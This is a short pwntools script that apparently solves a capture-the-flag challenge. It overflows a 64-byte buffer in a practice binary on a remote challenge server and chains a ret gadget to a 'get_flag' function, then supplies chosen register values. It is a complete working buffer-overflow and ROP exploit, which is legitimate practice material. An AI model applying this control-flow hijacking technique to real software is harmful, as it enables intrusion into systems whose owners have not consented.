from pwn import *

p = remote('forever.isss.io', 1304)
elf = ELF('./params')
rop = ROP(elf)

offset = 64
junk = b'A' * offset

payload = junk
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(elf.symbols['get_flag'])

p.sendline(payload)

p.sendline(b'0')		# rax
p.sendline(b'0')		# rbx
p.sendline(b'4')		# rcx
p.sendline(b'3735928559')	# rdx
p.sendline(b'3405691582')	# rsi
p.sendline(b'4919')		# rdi


p.interactive()
